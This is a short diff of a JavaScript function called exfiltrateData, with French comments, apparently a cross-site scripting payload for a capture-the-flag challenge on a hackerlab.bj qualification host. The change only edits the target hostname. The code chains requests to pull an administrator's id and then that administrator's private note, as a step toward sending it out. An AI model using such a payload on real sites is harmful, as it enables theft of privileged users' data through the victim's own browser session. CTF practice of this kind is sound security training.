@@ -40,7 +40,7 @@ function exfiltrateData(data) {
   try {
     // Créer une nouvelle instance de XMLHttpRequest pour récupérer l'admin_id
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://xnotes.qualif.hackerlab.bj/api.php", true);
+    xhr.open("GET", "https://notes.qualif.hackerlab.bj/api.php", true);
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4) {
         if (xhr.status == 200) {
@@ -50,7 +50,7 @@ function exfiltrateData(data) {
 
             // Créer une nouvelle instance de XMLHttpRequest pour récupérer le contenu de la note
             var noteXhr = new XMLHttpRequest();
-            noteXhr.open("GET", "https://xnotes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
+            noteXhr.open("GET", "https://notes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
             noteXhr.onreadystatechange = function() {
               if (noteXhr.readyState == 4) {
                 if (noteXhr.status == 200) {
